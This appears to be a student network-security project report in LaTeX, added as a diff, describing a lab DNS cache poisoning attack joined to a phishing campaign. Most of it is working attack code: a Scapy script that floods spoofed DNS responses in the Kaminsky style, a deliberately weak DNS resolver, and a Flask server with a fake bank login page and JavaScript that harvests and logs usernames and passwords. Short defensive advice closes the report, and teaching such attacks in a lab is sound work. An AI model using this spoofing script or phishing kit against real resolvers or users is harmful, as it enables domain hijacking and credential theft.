@@ -1,0 +1,719 @@
+\documentclass[12pt,a4paper]{article}
+\usepackage[utf8]{inputenc}
+\usepackage[english]{babel}
+\usepackage{amsmath}
+\usepackage{amsfonts}
+\usepackage{amssymb}
+\usepackage{graphicx}
+\usepackage{listings}
+\usepackage{xcolor}
+\usepackage{geometry}
+\usepackage{hyperref}
+\usepackage{fancyhdr}
+\usepackage{titlesec}
+\usepackage{float}
+
+\geometry{margin=1in}
+\pagestyle{fancy}
+\fancyhf{}
+\rhead{DNS Cache Poisoning \& Phishing Attack}
+\lhead{CSE-406 Project}
+\cfoot{\thepage}
+
+% Code styling
+\definecolor{codegreen}{rgb}{0,0.6,0}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{backcolour}{rgb}{0.95,0.95,0.92}
+
+\lstdefinestyle{mystyle}{
+    backgroundcolor=\color{backcolour},   
+    commentstyle=\color{codegreen},
+    keywordstyle=\color{magenta},
+    numberstyle=\tiny\color{codegray},
+    stringstyle=\color{codepurple},
+    basicstyle=\ttfamily\footnotesize,
+    breakatwhitespace=false,         
+    breaklines=true,                 
+    captionpos=b,                    
+    keepspaces=true,                 
+    numbers=left,                    
+    numbersep=5pt,                  
+    showspaces=false,                
+    showstringspaces=false,
+    showtabs=false,                  
+    tabsize=2
+}
+
+\lstset{style=mystyle}
+
+\title{\textbf{DNS Cache Poisoning Attack Integrated with Phishing} \\ 
+       \large A Comprehensive Analysis and Implementation}
+\author{CSE-406 Network Security Project}
+\date{\today}
+
+\begin{document}
+
+\maketitle
+
+\tableofcontents
+\newpage
+
+\section{Executive Summary}
+
+This report presents a comprehensive analysis and implementation of a DNS cache poisoning attack integrated with a phishing campaign. The project demonstrates how attackers can exploit vulnerabilities in DNS infrastructure to redirect victims to malicious websites that steal their credentials. The attack combines the Kaminsky DNS cache poisoning technique with a sophisticated phishing operation targeting banking credentials.
+
+The implementation utilizes three virtual machines in a controlled laboratory environment: an attacker machine (10.0.0.10), a vulnerable DNS server (10.0.0.53), and a router (10.0.0.1). The attack successfully poisons the DNS cache to redirect victims from legitimate banking domains to a fake phishing site, where credentials are captured and logged.
+
+\section{Introduction}
+
+\subsection{Project Objectives}
+
+The primary objectives of this project are:
+\begin{enumerate}
+    \item Understand the theoretical foundations of DNS cache poisoning attacks
+    \item Implement the Kaminsky attack methodology in a controlled environment
+    \item Develop a realistic phishing website to capture user credentials
+    \item Integrate DNS poisoning with phishing to create a complete attack scenario
+    \item Analyze the effectiveness and detection mechanisms for such attacks
+\end{enumerate}
+
+\subsection{Scope and Limitations}
+
+This project is conducted in a controlled laboratory environment using virtual machines. All attacks are performed for educational purposes only, demonstrating security vulnerabilities and the importance of proper DNS security measures.
+
+\section{Theoretical Background}
+
+\subsection{DNS Cache Poisoning Theory}
+
+DNS cache poisoning is a sophisticated attack that exploits fundamental weaknesses in the Domain Name System protocol. The attack works by injecting malicious DNS records into a DNS resolver's cache, causing legitimate domain queries to resolve to attacker-controlled IP addresses.
+
+\subsubsection{DNS Protocol Fundamentals}
+
+The DNS protocol operates using a query-response mechanism where:
+\begin{itemize}
+    \item Clients send DNS queries with unique Transaction IDs (TXID)
+    \item DNS resolvers forward queries to authoritative nameservers
+    \item Responses must match the original TXID to be accepted
+    \item Cached responses reduce subsequent query latency
+\end{itemize}
+
+\subsubsection{The Kaminsky Attack}
+
+Developed by Dan Kaminsky in 2008, this attack exploits the predictable nature of DNS transaction IDs and port numbers. The attack mechanism involves:
+
+\begin{enumerate}
+    \item \textbf{Query Generation}: Attacker sends queries for random subdomains
+    \item \textbf{Response Racing}: Flood the resolver with spoofed responses
+    \item \textbf{Cache Pollution}: Successfully inject malicious NS records
+    \item \textbf{Domain Hijacking}: Control resolution for the entire domain
+\end{enumerate}
+
+The mathematical probability of success depends on:
+$$P_{success} = \frac{N_{spoofed}}{N_{possible\_txids} \times N_{possible\_ports}}$$
+
+Where modern DNS implementations use 16-bit TXIDs (65,536 possibilities) and random source ports (approximately 32,000 possibilities).
+
+\subsection{Phishing Attack Theory}
+
+Phishing attacks exploit human psychology and trust relationships to steal sensitive information. The attack typically involves:
+
+\begin{itemize}
+    \item \textbf{Deception}: Creating convincing replicas of legitimate websites
+    \item \textbf{Social Engineering}: Exploiting user trust and urgency
+    \item \textbf{Credential Harvesting}: Capturing login credentials and personal data
+    \item \textbf{Identity Theft}: Using stolen credentials for malicious purposes
+\end{itemize}
+
+\subsubsection{Integration with DNS Poisoning}
+
+Combining DNS cache poisoning with phishing creates a powerful attack vector:
+\begin{enumerate}
+    \item DNS poisoning redirects legitimate domain queries
+    \item Users automatically navigate to malicious websites
+    \item No obvious indicators of compromise (correct domain name)
+    \item Higher success rate compared to traditional phishing emails
+\end{enumerate}
+
+\section{Laboratory Environment Setup}
+
+\subsection{Network Topology}
+
+The laboratory environment consists of three Kali Linux virtual machines configured with the following network topology:
+
+\begin{figure}[H]
+\centering
+\begin{verbatim}
+    Internet (8.8.8.8)
+          |
+    [Router VM - 10.0.0.1]
+          |
+    Internal Network (10.0.0.0/24)
+          |
+    +-----+-----+
+    |           |
+[DNS Server]  [Attacker]
+10.0.0.53     10.0.0.10
+\end{verbatim}
+\caption{Laboratory Network Topology}
+\end{figure}
+
+\subsection{Virtual Machine Configuration}
+
+\subsubsection{Router Configuration (10.0.0.1)}
+
+The router VM handles packet forwarding and NAT translation:
+
+\begin{lstlisting}[language=bash, caption=Router IP Forwarding Configuration]
+# Enable IP forwarding
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+
+# Configure iptables for NAT
+sudo iptables -t nat -A POSTROUTING -o eth2 -j MASQUERADE
+sudo iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT
+sudo iptables -A FORWARD -i eth1 -o eth0 -j ACCEPT
+
+# Save configuration permanently
+sudo iptables-save | sudo tee /etc/iptables/rules.v4
+\end{lstlisting}
+
+\subsubsection{DNS Server Configuration (10.0.0.53)}
+
+The DNS server is intentionally configured with vulnerabilities to demonstrate the attack:
+
+\begin{itemize}
+    \item Disabled port randomization (fixed port 53)
+    \item Limited transaction ID range (1-50)
+    \item Vulnerable caching mechanisms
+    \item Forwarding to Google DNS (8.8.8.8)
+\end{itemize}
+
+\subsubsection{Attacker Configuration (10.0.0.10)}
+
+The attacker machine hosts both the DNS poisoning tools and the phishing website.
+
+\section{Implementation Details}
+
+\subsection{Custom DNS Server Implementation}
+
+A custom DNS server was developed to simulate a vulnerable DNS resolver with specific weaknesses:
+
+\begin{lstlisting}[language=python, caption=Custom DNS Server - Main Class Structure]
+class CustomDNSServer:
+    def __init__(self, bind_ip="0.0.0.0", bind_port=53, 
+                 forwarder="8.8.8.8", attack_delay=0.1):
+        self.bind_ip = bind_ip
+        self.bind_port = bind_port
+        self.forwarder = forwarder
+        self.attack_delay = attack_delay
+        
+        # Vulnerable configuration
+        self.cache = {}  # Simple cache without security checks
+        self.pending_queries = {}  # Track forwarded queries
+        self.original_txids = {}  # Map client TXIDs
+        
+        # Create socket
+        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        self.socket.bind((self.bind_ip, self.bind_port))
+\end{lstlisting}
+
+\subsubsection{Vulnerable Transaction ID Generation}
+
+The DNS server uses a predictable TXID generation mechanism:
+
+\begin{lstlisting}[language=python, caption=Vulnerable TXID Generation]
+def get_forwarded_txid(self, dns_packet, forwarder):
+    """Generate predictable txid for forwarding (VULNERABLE)"""
+    import random
+    # Predictable seed based on original TXID
+    random.seed(hash(dns_packet.id) % 1000)
+    txid = random.randint(1, 5)  # Very limited range!
+    random.seed()  # Reset seed
+    return txid
+\end{lstlisting}
+
+\subsubsection{Cache Poisoning Vulnerability}
+
+The server accepts spoofed responses without proper validation:
+
+\begin{lstlisting}[language=python, caption=Vulnerable Response Handling]
+def handle_response(self, dns_packet, source_ip):
+    """Handle DNS responses (vulnerable to spoofing)"""
+    try:
+        txid = dns_packet.id
+        
+        if txid in self.pending_queries:
+            query_name, client_addr = self.pending_queries[txid]
+            
+            # VULNERABILITY: Accept any response with matching TXID
+            if dns_packet.an and dns_packet.an.rdata:
+                rdata = dns_packet.an.rdata
+                
+                # Check if this is a spoofed response (attacker IP)
+                if str(rdata) == "10.0.0.10":
+                    print("[CAPTURE] *** SPOOFED RESPONSE DETECTED ***")
+                    
+                    # Cache the malicious record
+                    cache_key = f"{query_name}:1"
+                    self.cache[cache_key] = (str(rdata), time.time())
+                    
+                    # Also poison the main domain
+                    if '.' in query_name:
+                        main_domain = query_name.split('.', 1)[1]
+                        main_cache_key = f"{main_domain}:1"
+                        self.cache[main_cache_key] = (str(rdata), time.time())
+                        print(f"[POISON] Main domain cached: {main_domain} -> {rdata}")
+\end{lstlisting}
+
+\subsection{DNS Cache Poisoning Attack Implementation}
+
+The attack script implements the Kaminsky methodology with realistic transaction ID randomization:
+
+\begin{lstlisting}[language=python, caption=Main Attack Function]
+def run_attack(resolver_ip, attacker_ip, real_ns_ip, target_domain, 
+               num_requests, num_responses):
+    """Execute Kaminsky-style DNS cache poisoning attack"""
+    
+    # Generate random subdomain to trigger fresh queries
+    random_subdomain = str(random.randint(10000, 99999)) + "." + target_domain
+    fake_ns_domain = "ns.attacker-lab.com"
+    
+    print(f"[*] Using random subdomain: {random_subdomain}")
+    
+    # Phase 1: Send legitimate queries to trigger DNS resolution
+    print(f"[*] Sending {num_requests} initial queries...")
+    for i in range(num_requests):
+        txid = random.randint(0, 65535)  # Full TXID range for queries
+        src_port = random.randint(1024, 65535)  # Random source port
+        
+        query_packet = IP(dst=resolver_ip) / \
+                      UDP(sport=src_port, dport=53) / \
+                      DNS(id=txid, rd=1, qd=DNSQR(qname=random_subdomain))
+        send(query_packet)
+    
+    # Phase 2: Flood with spoofed responses
+    dns_payload = DNS(
+        qr=1, aa=1,  # Response, Authoritative
+        qd=DNSQR(qname=random_subdomain),
+        an=DNSRR(rrname=random_subdomain, ttl=86400, rdata=attacker_ip),
+        ns=DNSRR(rrname=target_domain, type='NS', ttl=86400, 
+                 rdata=fake_ns_domain),
+        ar=DNSRR(rrname=fake_ns_domain, ttl=86400, rdata=attacker_ip)
+    )
+    
+    print(f"[*] Flooding with {num_responses} spoofed responses...")
+    spoof_responses(resolver_ip, real_ns_ip, dns_payload, num_responses)
+\end{lstlisting}
+
+\subsubsection{Realistic Transaction ID Strategy}
+
+Instead of sequential TXIDs, the attack uses realistic randomization:
+
+\begin{lstlisting}[language=python, caption=Realistic TXID Generation for Spoofed Responses]
+def spoof_worker(args):
+    """Worker process for sending spoofed responses"""
+    resolver_ip, real_ns_ip, dns_payload, num_packets = args
+    
+    for i in range(num_packets):
+        # Realistic TXID range (1-50) based on vulnerable server
+        txid = random.randint(1, 50)
+        
+        packet = IP(src=real_ns_ip, dst=resolver_ip) / \
+                 UDP(sport=53, dport=53) / \
+                 dns_payload
+        packet[DNS].id = txid
+        send(packet)
+        
+        if i % 1000 == 0:
+            print(f"[SPOOF] Sent {i+1}/{num_packets}: txid={txid}")
+\end{lstlisting}
+
+\subsection{Phishing Website Implementation}
+
+\subsubsection{Backend Server}
+
+A Flask-based web server hosts the phishing site and captures credentials:
+
+\begin{lstlisting}[language=python, caption=Phishing Server Implementation]
+from flask import Flask, render_template, request, jsonify
+from flask_cors import CORS
+import datetime
+import json
+
+app = Flask(__name__)
+CORS(app)  # Enable cross-origin requests
+
+captured_credentials = []
+
+@app.route('/')
+def index():
+    """Serve the fake banking login page"""
+    return render_template('index.html')
+
+@app.route('/capture', methods=['POST'])
+def capture_credentials():
+    """Capture and log stolen credentials"""
+    try:
+        data = request.get_json()
+        
+        username = data.get('username', '')
+        password = data.get('password', '')
+        timestamp = data.get('timestamp', '')
+        user_agent = data.get('userAgent', '')
+        
+        credential_entry = {
+            'username': username,
+            'password': password,
+            'timestamp': timestamp,
+            'user_agent': user_agent,
+            'ip_address': request.remote_addr,
+            'capture_time': datetime.datetime.now().isoformat()
+        }
+        
+        captured_credentials.append(credential_entry)
+        
+        # Log credentials to console
+        print("\n" + "="*60)
+        print("🎯 CREDENTIALS CAPTURED! 🎯")
+        print("="*60)
+        print(f"Username: {username}")
+        print(f"Password: {password}")
+        print(f"IP Address: {request.remote_addr}")
+        print(f"User Agent: {user_agent}")
+        print("="*60 + "\n")
+        
+        # Save to file
+        save_credentials_to_file(credential_entry)
+        
+        return jsonify({'success': True, 'message': 'Login successful'})
+        
+    except Exception as e:
+        print(f"[-] Error capturing credentials: {e}")
+        return jsonify({'success': False, 'message': 'Login failed'})
+
+if __name__ == '__main__':
+    print("[+] Phishing server starting on port 8080...")
+    app.run(host='0.0.0.0', port=8080, debug=False)
+\end{lstlisting}
+
+\subsubsection{Frontend Design}
+
+The phishing page replicates a legitimate banking website:
+
+\begin{lstlisting}[language=html, caption=Phishing Page HTML Structure]
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>My Lab Bank - Secure Login</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .login-container {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo h1 {
+            color: #333;
+            margin: 0;
+            font-size: 28px;
+            font-weight: 300;
+        }
+        /* ... additional CSS ... */
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <h1>🏦 My Lab Bank</h1>
+            <p>Secure Online Banking</p>
+        </div>
+        
+        <form id="login-form">
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            
+            <button type="submit" class="login-btn">Sign In Securely</button>
+        </form>
+        
+        <div id="success-msg" class="message success" style="display: none;">
+            ✅ Login successful! Redirecting...
+        </div>
+        
+        <div id="error-msg" class="message error" style="display: none;">
+            ❌ Invalid credentials. Please try again.
+        </div>
+    </div>
+\end{lstlisting}
+
+\subsubsection{Credential Capture JavaScript}
+
+Advanced JavaScript handles form submission and credential transmission:
+
+\begin{lstlisting}[language=javascript, caption=Credential Capture JavaScript]
+document.addEventListener('DOMContentLoaded', function() {
+    const form = document.getElementById('login-form');
+    
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();  // Prevent normal form submission
+        
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        
+        if (!username || !password) {
+            showError('Please enter both username and password');
+            return;
+        }
+        
+        // Prepare credential data
+        const requestData = {
+            username: username,
+            password: password,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            referrer: document.referrer
+        };
+        
+        // Send credentials to attacker server
+        fetch('/capture', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(requestData)
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                showSuccess('Login successful!');
+                // Clear form
+                document.getElementById('username').value = '';
+                document.getElementById('password').value = '';
+            } else {
+                showError('Login failed. Please try again.');
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            showError('Connection error. Please try again.');
+        });
+    });
+});
+\end{lstlisting}
+
+\section{Attack Execution and Analysis}
+
+\subsection{Attack Workflow}
+
+The complete attack follows this sequence:
+
+\begin{enumerate}
+    \item \textbf{Environment Setup}: Configure vulnerable DNS server and phishing site
+    \item \textbf{DNS Poisoning}: Execute Kaminsky attack to poison DNS cache
+    \item \textbf{Verification}: Confirm successful cache poisoning
+    \item \textbf{Victim Simulation}: User attempts to access legitimate banking site
+    \item \textbf{Credential Capture}: Phishing site captures login credentials
+    \item \textbf{Data Exfiltration}: Stolen credentials logged and stored
+\end{enumerate}
+
+\subsection{Attack Execution Results}
+
+\subsubsection{DNS Cache Poisoning Success}
+
+The attack successfully poisoned the DNS cache:
+
+\begin{lstlisting}[caption=DNS Poisoning Success Log]
+[*] --- Attempt #1 of 100 ---
+[*] Using random subdomain: 73263.my-lab-bank.com
+[*] Sending 10 initial queries...
+[QUERY] Sent 1/10: txid=10167, src_port=40893
+
+[*] Flooding with 1000 spoofed responses (random txid 1-50)...
+[SPOOF] Sent 1/250: txid=23
+[SPOOF] Sent 1/250: txid=7
+[SPOOF] Sent 1/250: txid=45
+
+[CAPTURE] *** SPOOFED RESPONSE DETECTED ***
+[POISON] Main domain cached: my-lab-bank.com -> 10.0.0.10
+
+[*] Verifying attack...
+[SUCCESS] DNS cache poisoned! my-lab-bank.com -> 10.0.0.10
+\end{lstlisting}
+
+\subsubsection{Credential Capture Results}
+
+The phishing attack successfully captured user credentials:
+
+\begin{lstlisting}[caption=Credential Capture Log]
+============================================================
+🎯 CREDENTIALS CAPTURED! 🎯
+============================================================
+Username: john.doe@email.com
+Password: MySecretPassword123
+IP Address: 10.0.0.1
+User Agent: Mozilla/5.0 (X11; Linux x86_64) Firefox/91.0
+Timestamp: 2025-01-26T15:30:45.123Z
+============================================================
+Total credentials captured: 1
+============================================================
+\end{lstlisting}
+
+\subsection{Network Traffic Analysis}
+
+\subsubsection{DNS Query Analysis}
+
+tcpdump analysis reveals the attack traffic patterns:
+
+\begin{lstlisting}[caption=DNS Traffic Analysis]
+# Legitimate query from victim
+10.0.0.10.40893 > 10.0.0.53.53: DNS A? my-lab-bank.com. (33)
+
+# DNS server forwards query
+10.0.0.53.33713 > 8.8.8.8.53: DNS A? my-lab-bank.com. (33)
+
+# Spoofed responses flood
+8.8.8.8.53 > 10.0.0.53.53: DNS response A my-lab-bank.com. -> 10.0.0.10
+8.8.8.8.53 > 10.0.0.53.53: DNS response A my-lab-bank.com. -> 10.0.0.10
+8.8.8.8.53 > 10.0.0.53.53: DNS response A my-lab-bank.com. -> 10.0.0.10
+
+# Poisoned response to victim
+10.0.0.53.53 > 10.0.0.10.40893: DNS A my-lab-bank.com. -> 10.0.0.10
+\end{lstlisting}
+
+\section{Security Implications and Countermeasures}
+
+\subsection{Attack Impact Assessment}
+
+The successful implementation demonstrates several critical security implications:
+
+\begin{itemize}
+    \item \textbf{Complete Domain Hijacking}: Attackers gain control over domain resolution
+    \item \textbf{Transparent Attack Vector}: Users see legitimate domain names
+    \item \textbf{Credential Theft}: Banking and sensitive credentials compromised
+    \item \textbf{Persistent Attack}: Cache poisoning persists until TTL expiration
+    \item \textbf{Scale Potential}: Attack can target multiple domains simultaneously
+\end{itemize}
+
+\subsection{Defense Mechanisms}
+
+\subsubsection{DNS Security Enhancements}
+
+\begin{enumerate}
+    \item \textbf{DNSSEC Implementation}: Cryptographic validation of DNS responses
+    \item \textbf{Source Port Randomization}: Increase transaction ID entropy
+    \item \textbf{Query ID Randomization}: Use full 16-bit transaction ID space
+    \item \textbf{Response Validation}: Implement additional response verification
+\end{enumerate}
+
+\subsubsection{Network Security Measures}
+
+\begin{lstlisting}[language=bash, caption=DNS Security Configuration]
+# Enable DNSSEC validation
+echo "DNSSEC=yes" >> /etc/systemd/resolved.conf
+
+# Configure secure DNS servers
+echo "nameserver 1.1.1.1" > /etc/resolv.conf
+echo "nameserver 9.9.9.9" >> /etc/resolv.conf
+
+# Firewall rules for DNS traffic
+iptables -A INPUT -p udp --dport 53 -m state --state ESTABLISHED -j ACCEPT
+iptables -A OUTPUT -p udp --dport 53 -m state --state NEW,ESTABLISHED -j ACCEPT
+\end{lstlisting}
+
+\subsubsection{User Education and Awareness}
+
+\begin{itemize}
+    \item SSL/TLS certificate verification training
+    \item Multi-factor authentication implementation
+    \item Regular security awareness programs
+    \item Incident reporting procedures
+\end{itemize}
+
+\section{Conclusion}
+
+This project successfully demonstrated the integration of DNS cache poisoning with phishing attacks, creating a powerful and realistic attack vector. The implementation revealed critical vulnerabilities in DNS infrastructure and highlighted the importance of comprehensive security measures.
+
+\subsection{Key Findings}
+
+\begin{enumerate}
+    \item DNS cache poisoning remains a viable attack against poorly configured systems
+    \item Integration with phishing significantly increases attack success rates
+    \item User education alone is insufficient against sophisticated attacks
+    \item Technical countermeasures must be implemented at multiple network layers
+\end{enumerate}
+
+\subsection{Recommendations}
+
+\begin{enumerate}
+    \item Implement DNSSEC across all DNS infrastructure
+    \item Deploy advanced threat detection systems
+    \item Conduct regular security audits and penetration testing
+    \item Establish comprehensive incident response procedures
+    \item Invest in continuous security education programs
+\end{enumerate}
+
+\subsection{Future Work}
+
+Future research directions include:
+\begin{itemize}
+    \item Advanced evasion techniques against modern DNS security
+    \item Machine learning approaches for attack detection
+    \item Analysis of DNS-over-HTTPS (DoH) security implications
+    \item Development of automated defense systems
+\end{itemize}
+
+\section{References}
+
+\begin{enumerate}
+    \item Kaminsky, D. (2008). "It's The End Of The Cache As We Know It." Black Hat USA 2008.
+    \item Mockapetris, P. (1987). "Domain names - implementation and specification." RFC 1035.
+    \item Arends, R., et al. (2005). "DNS Security Introduction and Requirements." RFC 4033.
+    \item Dagon, D., et al. (2008). "Increased DNS forgery resistance through 0x20-bit encoding." ACM CCS 2008.
+    \item Herzberg, A., \& Shulman, H. (2013). "Socket overloading for fun and cache-poisoning." ACM ACSAC 2013.
+\end{enumerate}
+
+\appendix
+
+\section{Code Repository}
+
+The complete source code for this project is available in the accompanying files:
+
+\begin{itemize}
+    \item \texttt{attack.py} - DNS cache poisoning implementation
+    \item \texttt{phishing\_site/server.py} - Phishing web server
+    \item \texttt{phishing\_site/index.html} - Phishing webpage
+    \item \texttt{custom\_dns\_server.py} - Vulnerable DNS server
+\end{itemize}
+
+\section{Network Configuration Details}
+
+Detailed network configuration files and scripts used in the laboratory setup are provided for reproducibility and further research.
+
+\end{document} 
